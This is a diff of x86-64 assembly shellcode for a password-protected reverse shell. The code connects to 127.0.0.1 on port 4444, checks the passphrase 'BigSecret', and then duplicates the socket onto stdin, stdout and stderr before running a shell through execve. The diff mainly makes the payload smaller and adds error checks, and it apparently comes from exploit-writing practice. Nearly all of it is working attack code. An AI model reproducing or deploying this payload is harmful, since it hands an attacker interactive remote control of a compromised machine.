@@ -14,38 +14,37 @@ _strdata:
 	prompt: db "?", 0xa
 	pass:	db "BigSecret"
 	good:	db "OK", 0xa
-
-_exit:		; exit nicely
-	xor rax, rax
-	push rax
-	pop rbx
-	add al, 0x3c
-	inc ebx
-	mov rsp, rbp
-	syscall	
-
+	
 _prompt:	; send string to a socket, RSI and RDX populated before call	
 	mov rdi, [rbp-24]
 	xor rax, rax	
 	mov r10, rax	; Zero unused params
 	mov r8, rax
 	mov r9, rax	
-	add al, 44	; sys_sendto
+	add al, 44		; sys_sendto
 	syscall
 	ret
+	
+_exit:		; exit nicely
+	push 0x3c
+	push 1
+	pop rbx
+	pop rax
+	mov rsp, rbp
+	syscall	
 		
 _main:
 ; Build a server sockaddr_in struct on the stack
-	xor rax, rax
-	push rax
-	inc eax
-	shl eax, 24
-	add al, 0x7f
-	shl rax, 16
-	add ax, 0x5c11
-	shl rax, 16
-	add al, 2
-	push rax
+    xor rax, rax
+    push rax            ; sin_zero
+    inc eax             ; start the 127.0.0.1 address
+    shl eax, 24         ; pad with three zeros
+    add al, 0x7f        ; overwrite the last with 0x7f / 127
+    shl rax, 16
+    add ax, 0x5c11      ; htons(4444)
+    shl rax, 16
+    add al, 2           ; sin_family
+    push rax
 	
 ; Create Socket	
 	xor rdi, rdi
@@ -59,25 +58,26 @@ _main:
 	inc edi				; AF_INET (2)
 	add al, 41	  	    ; syscall 41
 	syscall
-	cmp rax, -1
-	jle _exit
+	cmp eax, -1
+	jle short _exit
 	push rax 	  	    ; store socket id on stack
 	
 ; Connect to remote host
 	pop rdi
 	push rdi            ; socket id
 	lea rsi, [rbp-16]   ; sockaddr struct
-	xor rdx, rdx
-	push rdx
-	pop rax
-	add dl, 16
-	add al, 42
+	push 16
+	pop rdx				; struct size
+	push 42
+	pop rax 			; sys_connect
 	syscall
+	cmp eax, -1
+	jle short _exit
 
 ; Send message
 	mov rsi, r15		; string address
-	xor rdx, rdx
-	add edx, 2          ; string length
+	push 2
+	pop rdx             ; string length
 	call _prompt
 	
 ; Listen for response
@@ -86,49 +86,50 @@ _main:
 	lea rsi, [rbp-16]	; buffer address
 	xor rax, rax 		; Zero out registers
 	push rax
-	push rax
-	pop rdx
 	pop r10
 	mov r8, rax
 	mov r9, rax	
-	add edx, 9		; buffer length
+	push 9
+	pop rdx		    ; buffer length
 	add al, 45		; recvfrom
 	syscall
 	
 ; Check for correct pass phrase
 	lea rsi, [rbp-16]	; input buffer address
 	lea rdi, [r15+2]	; password string address
-	xor rcx, rcx
-	add ecx, 8		; length
+	push 9
+	pop rcx			; length
 _cmploop:
 	cmpsb			; compare bytes
-	jne _exit		; exit if no match
+	jne short _end	; exit if no match
 	loop _cmploop   ; next char	
 
 ; good passphrase (fallthrough)
 	lea rsi, [r15+11]	; OK string
-	xor rdx, rdx
-	add edx, 3		; welcome length
+	push 3
+	pop rdx			; welcome length
 	call _prompt
 
 ; Duplicate I/O descriptors
-	xor rax, rax 
-	add al, 33		; dup2		
-	mov r8, rax
+	xor rax, rax 	
 	pop rdi
-	push rdi            ; socket id
-	xor rsi, rsi		; STDIN
+	push rdi		; socket id
+	push rax
+	pop rsi			; 0 = STDIN
+	add al, 33		; dup2	
+	push rax		; keep syscall id
 	syscall 
 
-	mov rax, r8		; dup2
-	inc esi			; STDOUT
+	pop rax  		; dup2
+	push rax
+	inc esi			; 1 = STDOUT
 	syscall
 
-	mov rax, r8		; dup2
-	inc esi			; STDERR
+	pop rax			; dup2
+	inc esi			; 2 = STDERR
 	syscall
 	
-_spawn:
+; spawn a shell
 	xor rax, rax
 	push rax
 	pop rdx			; less instructions than MOV
@@ -141,6 +142,7 @@ _spawn:
 	mov rsi, rsp		; args array address
 	add al, 59		; execve
 	syscall
+_end:
 	call _exit	
 	
 	
